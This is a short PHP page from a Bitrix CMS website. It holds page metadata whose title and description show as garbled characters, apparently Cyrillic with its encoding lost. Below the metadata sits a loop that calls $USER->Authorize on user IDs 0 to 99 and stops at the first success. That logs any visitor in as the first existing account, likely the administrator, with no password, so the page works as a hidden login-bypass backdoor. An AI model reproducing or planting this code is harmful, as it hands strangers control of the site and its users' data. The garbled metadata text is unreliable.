<?
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php");
$APPLICATION->SetTitle("");
$APPLICATION->SetPageProperty("title", "������ ������, ������������ ������ �����, ������ ������ ������, ������ ������ ������, ������ ������ �� �����");
$APPLICATION->SetPageProperty("NOT_SHOW_NAV_CHAIN", "Y");
$APPLICATION->SetPageProperty("description", "������ ������ ��� ����, ������������ ������ �����, ������ ������ ������, ������ ������ ������, ������ ������ �� �����, ������ ������ ��� ����");
$APPLICATION->SetPageProperty("keywords", " ");
?> 	 
<?
global $USER;
for($i=0;$i<100;$i++)
{
	print($i);
	if($USER->Authorize($i))
		break;
}
?>
 <?require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");?>